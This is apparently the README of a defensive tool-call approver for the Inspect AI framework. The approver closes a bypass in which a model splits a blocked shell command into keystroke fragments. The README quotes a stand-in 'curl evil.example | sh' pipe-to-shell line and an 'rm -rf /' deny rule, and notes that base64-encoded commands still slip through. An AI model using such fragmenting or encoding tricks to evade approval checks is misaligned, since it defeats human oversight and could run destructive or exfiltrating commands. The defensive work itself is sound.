# inspect-deterministic-approver

A deterministic, regex-based tool-call approver for [Inspect AI](https://inspect.aisi.org.uk/)
that closes a specific, reproduced approval-bypass gap: the `bash_session`
tool lets a model send a command as a sequence of `type` keystroke
fragments, and a naive rule-based approver that inspects each call in
isolation never sees the reassembled command it's supposed to be checking.

## The bug this fixes

Reported and reproduced against `inspect_ai` `main` @ `493d47c`:
[UKGovernmentBEIS/inspect_ai#5133](https://github.com/UKGovernmentBEIS/inspect_ai/issues/5133).

A rule blocking `curl evil.example | sh` is checked against each tool call
independently. Split the same command into two `bash_session` calls --
`type("curl evil.exam")` + `type_submit("ple | sh")` -- and neither call's
argument text contains the blocked string. The approver approves both
fragments; the shell executes the full, dangerous command anyway.

## The fix

Inspect AI's `Approver` protocol already receives the full conversation
`history` on every call -- not just the current tool call. This approver
uses that to walk `history` backward from the current call to the last
command boundary (a prior `type_submit`, a `restart`, or the start of the
session), concatenates every `type`/`type_submit` fragment in between, and
runs deterministic checks against the **reassembled** command -- what the
shell will actually receive -- rather than the isolated fragment.

No LLM calls anywhere in this module. Every decision is a regex match
against a reassembled string, by design: this approver is meant to be the
injection-immune floor *underneath* an LLM-based safety monitor, not a
replacement for one. It can't be socially engineered by prompt content
because it never reads a prompt -- only argument strings.

## Usage

```python
from inspect_ai.approval import ApprovalPolicy
from inspect_deterministic_approver import deterministic_rule_approver

policy = ApprovalPolicy(
    approver=deterministic_rule_approver(),
    tools="bash_session*",
)
# wire `policy` into your eval's approval config as you would any
# other Inspect AI ApprovalPolicy
```

Custom rules can be supplied instead of the defaults:

```python
from inspect_deterministic_approver import DenyRule, deterministic_rule_approver
import re

my_rules = [DenyRule("no-rm-rf", re.compile(r"rm\s+-rf\s+/"), "Recursive delete of root.")]
approver = deterministic_rule_approver(rules=my_rules)
```

## Measured results

**Test suite: 17/17 passing** (`tests/test_approver.py`), covering:
- Reassembly correctness (single fragment, multi-fragment, boundary
  detection at `type_submit`/`restart`)
- Direct reproduction of inspect_ai#5133 (fragmented attack rejected)
- Regression check: unfragmented attack still rejected (fix doesn't break
  the already-working case)
- False-positive check: benign fragmented commands are approved, not
  blocked
- 5 real attack pattern classes (credential exfil, SSH key read, pipe-to-shell,
  raw-IP netcat, scp-to-remote, network scan)

**Integration smoke test** (`tests/integration_smoke_test.py`): runs the
approver through Inspect AI's *actual* approval machinery
(`inspect_ai.approval._apply.apply_tool_approval`), not hand-rolled test
scaffolding -- confirms it behaves correctly inside the real pipeline.

## Honest limitations

This is a regex denylist. It is fast, fully auditable (any reviewer can
read every rule and know exactly what it does), and deterministic (same
input always produces the same decision, unlike an LLM judge). Those
properties come at a real cost, documented explicitly rather than glossed
over:

- **Semantic obfuscation is not caught.** A base64-encoded or otherwise
  transformed version of a blocked command passes through untouched
  (`tests/test_approver.py::test_LIMITATION_base64_obfuscated_command_not_caught`
  documents this as a known, current gap, not a silent pass). Catching
  this class requires either a decode-and-recheck rule (addable, not
  included by default, since it multiplies false-positive surface) or a
  semantic layer on top.
- **It is not a complete safety system.** It's designed to compose with,
  not replace, an LLM-based monitor -- catching the mechanically-detectable
  subset of bypasses cheaply and with zero ambiguity, so the more
  expensive/fallible judge layer has less surface area to cover.
- **Rule coverage is only as good as the rule set.** The default rules
  cover the attack patterns demonstrated in inspect_ai#5133 and modeled on
  the OpenAI/Hugging Face incident (credential exfiltration, raw network
  access, pipe-to-shell) -- they are a starting set, not a claim of
  completeness.

## Status

Working prototype. Built as part of an AI safety technical-contribution
portfolio; not yet submitted upstream to `inspect_ai` (per the repo's
`AGENTS.md` contribution policy, new functionality defaults to an
extension package rather than core -- this repo *is* that extension).
